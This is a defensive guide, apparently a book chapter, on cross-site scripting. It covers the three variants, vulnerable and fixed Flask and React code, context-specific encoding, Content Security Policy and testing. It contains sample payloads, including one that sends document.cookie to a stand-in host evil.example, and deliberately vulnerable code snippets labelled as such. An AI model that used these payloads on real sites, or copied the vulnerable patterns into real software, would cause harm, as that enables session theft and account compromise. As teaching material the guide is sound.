## The problem

A web page is a program. When your server or client inserts text supplied by a user into that program without making clear "this is data, not code", the browser executes whatever the text says. The attacker's script then runs *as the victim*, inside your origin: it can read the DOM (including data the victim is viewing), make authenticated requests, steal non-HttpOnly cookies and tokens, rewrite the page to phish, or chain into CSRF-protected actions (because it has the CSRF token). Any site that displays user-supplied content, which is every site, must solve this.

## Three variants, one mechanism

- **Reflected**: the payload arrives in the request (query string, form field) and is echoed into the response. `https://app/search?q=<script>…</script>`. Delivered via a crafted link.
- **Stored**: the payload is saved (a comment, a profile name, a support ticket, a filename) and rendered to other users later. Hits everyone who views it, including admins.
- **DOM-based**: the server never sees the payload; client-side JavaScript takes data from a source (`location.hash`, `postMessage`, a fetched JSON field) and writes it into a sink (`innerHTML`, `document.write`, `eval`, `href="javascript:"`).

The mechanism is identical: untrusted text is inserted into an HTML, JavaScript, URL or CSS *context* without the encoding that context requires.

## Vulnerable and fixed

:::vulnerable
```python
# Flask/Jinja2 with autoescape disabled or Markup misuse
@app.get("/search")
def search():
    q = request.args.get("q", "")
    return f"<h1>Results for {q}</h1>"         # raw string formatting: q is inserted as HTML
```
Request `?q=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">` runs script in every visitor's browser who clicks the link.
:::

:::secure
```python
# Let the template engine escape by default (Jinja2 autoescape=True in Flask/FastAPI templates)
@app.get("/search")
def search():
    q = request.args.get("q", "")
    return render_template("search.html", q=q)      # {{ q }} → &lt;img src=x onerror=...&gt;
```
The `<` becomes `&lt;` and the browser displays the text instead of parsing a tag.
:::

:::vulnerable
```javascript
// React: dangerouslySetInnerHTML with user content
function Comment({ body }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />;     // body from the API, authored by another user
}
```
:::

:::secure
```javascript
// Default React rendering escapes text; for rich text, sanitise with an allow-list first
import DOMPurify from 'dompurify';
function Comment({ body }) {
  return <div>{body}</div>;                                     // plain text: safe by default
}
function RichComment({ html }) {
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });   // strips scripts, event handlers, javascript: URLs
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```
:::

:::vulnerable
```javascript
// DOM XSS: reading from the URL and writing HTML
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;   // ?name=<img src=x onerror=alert(1)>
```
:::

:::secure
```javascript
document.getElementById('greeting').textContent = 'Hello ' + name;  // textContent never parses HTML
```
:::

## Contexts and encoding

Encoding depends on *where* the data lands. The wrong encoding for the context is as bad as none.

| Context | Example | Required handling |
|---|---|---|
| HTML body | `<p>{{ name }}</p>` | HTML entity encode `& < > " '` (template autoescape) |
| HTML attribute | `<input value="{{ name }}">` | Entity encode, and **always quote attributes** |
| URL in attribute | `<a href="{{ url }}">` | Validate scheme is `http`/`https`/relative (block `javascript:`, `data:`), then URL-encode parameters |
| JavaScript string | `<script>var n = "{{ name }}";</script>` | Avoid entirely; pass data via `data-` attributes or a JSON `<script type="application/json">` block with `<` escaped as `<`; never template into JS |
| CSS | `style="color: {{ c }}"` | Allow-list values; never template arbitrary CSS |
| Event handlers | `onclick="{{ x }}"` | Never. |
| Markdown / rich text | user-authored content | Render to HTML, then sanitise with an allow-list (DOMPurify, bleach/nh3); disallow raw HTML passthrough |
| SVG uploads | `<img src="user.svg">` is safe-ish; inline `<svg>` or direct navigation is not | Serve from a separate origin with `Content-Disposition: attachment`, or sanitise aggressively |
| JSON API responses | `{"name": "<script>"}` | Fine as JSON (`Content-Type: application/json`, `X-Content-Type-Options: nosniff`); the danger is the client's rendering |

Modern frameworks (React, Vue, Angular, Jinja2 with autoescape, Django templates, Rails ERB) encode HTML body and attribute contexts by default. They do **not** protect: `dangerouslySetInnerHTML` / `v-html` / `[innerHTML]`, `href` values with `javascript:` schemes (React blocks some, not all), templating into `<script>`, server-side string concatenation, `|safe` / `Markup()` / `raw` escapes used on user data, third-party widgets that take HTML, and legacy jQuery `.html()` calls.

## Content Security Policy as backstop

Encoding prevents injection; [[csp]] limits the damage when something slips through, by telling the browser which scripts may run.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-7f3a9c2e' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  form-action 'self';
  img-src 'self' data: https://cdn.client.com;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.client.com;
  report-uri /csp-report
```

With a **nonce-based** policy, only `<script nonce="7f3a9c2e">` tags (nonce generated per response) and scripts they load (`strict-dynamic`) execute; an injected `<script>` or `onerror=` handler has no nonce and is blocked. This defeats the vast majority of XSS payloads even when encoding fails. Rules: no `'unsafe-inline'` for scripts; no `'unsafe-eval'`; avoid host allow-lists for scripts (CDNs host JSONP endpoints that bypass them); start with `Content-Security-Policy-Report-Only` to find violations, then enforce. SPAs built with modern bundlers support nonces or hashes; inline event handlers must be refactored to `addEventListener`. Chapter 15 covers the full header set.

## Related defences

- **HttpOnly cookies** keep session IDs out of script's reach; XSS can still act as the user while the page is open, but cannot exfiltrate the session for later.
- **Trusted Types** (`require-trusted-types-for 'script'` in CSP) make DOM sinks reject plain strings in supporting browsers, eliminating DOM XSS classes in new code.
- **Separate origins for user content** (uploads, previews) so that even executing content there cannot reach your application's cookies and DOM.
- **`X-Content-Type-Options: nosniff`** stops browsers from treating a JSON or text response as HTML.
- **Input validation** helps (a phone number field should not accept `<`), but it is not the primary defence: legitimate data often contains special characters (`O'Brien`, `<3`), and the same data is rendered in many contexts.

## Where XSS hides

Usernames and display names (rendered in admin panels: stored XSS against admins is the privilege-escalation path), filenames (rendered in lists), error messages that echo input, search result highlighting, email templates rendered as HTML, PDF generation via HTML-to-PDF converters (XSS in the converter can become server-side file read), log viewers displaying raw log lines, Markdown renderers with HTML enabled, `postMessage` handlers that trust the message, and third-party embeds.

## Testing

- Submit a canary string such as `"><svg onload=alert(document.domain)>` in every input and look where it appears unencoded (including admin views and emails).
- Grep the codebase for `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `|safe`, `Markup(`, `mark_safe`, `html_safe`, `document.write`, `eval(`, `new Function(`, `setTimeout("`.
- Run the SPA with a strict CSP in report-only mode and review violations.
- Use a DAST scanner (ZAP) for reflected XSS; manual review for stored and DOM.
- Add unit tests that render components with hostile strings and assert no script tags survive.

## Common mistakes

- Disabling autoescape globally "because one page needed HTML".
- `|safe` on user-controlled data.
- Sanitising on *input* only, then rendering in a new context later.
- Allow-listing `javascript:` by accident through missing URL scheme validation.
- Markdown libraries with raw HTML enabled.
- CSP with `'unsafe-inline'` scripts, which disables its main protection.
- Trusting `postMessage` data without checking `event.origin`.
- Treating admin interfaces as "internal" and skipping encoding there.
